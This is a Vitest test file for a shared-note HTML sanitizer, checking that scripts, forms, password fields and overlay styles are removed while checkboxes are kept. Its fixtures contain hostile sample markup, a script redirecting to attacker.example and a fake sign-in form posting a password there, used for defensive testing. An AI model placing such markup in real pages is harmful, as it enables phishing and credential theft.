// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { sanitizeSharedNoteHtml } from "./shared-note-html";

describe("sanitizeSharedNoteHtml", () => {
  it("removes every prohibited form-control tag independently", () => {
    const forbiddenTags = ["form", "button", "textarea", "select", "option", "optgroup", "datalist", "fieldset"];

    for (const tag of forbiddenTags) {
      const sanitized = sanitizeSharedNoteHtml(`<${tag}>Attacker-controlled prompt</${tag}>`);
      const document = new DOMParser().parseFromString(sanitized, "text/html");

      expect(document.querySelector(tag), tag).toBeNull();
    }
  });

  it("removes executable and overlay content while preserving task-list formatting", () => {
    const sanitized = sanitizeSharedNoteHtml(`
      <script>window.location = "https://attacker.example"</script>
      <form action="https://attacker.example">
        <input type="password" name="password">
        <button>Sign in</button>
      </form>
      <p style="position: fixed; inset: 0; color: red">Safe text</p>
      <input type="checkbox" name="completed" checked>
    `);
    const document = new DOMParser().parseFromString(sanitized, "text/html");

    expect(document.querySelector("script, form, button, input[type='password']")).toBeNull();

    const paragraph = document.querySelector("p");
    expect(paragraph?.style.color).toBe("red");
    expect(paragraph?.style.position).toBe("");
    expect(paragraph?.style.inset).toBe("");

    const checkbox = document.querySelector<HTMLInputElement>("input[type='checkbox']");
    expect(checkbox).not.toBeNull();
    expect(checkbox?.disabled).toBe(true);
    expect(checkbox?.hasAttribute("name")).toBe(false);
  });
});
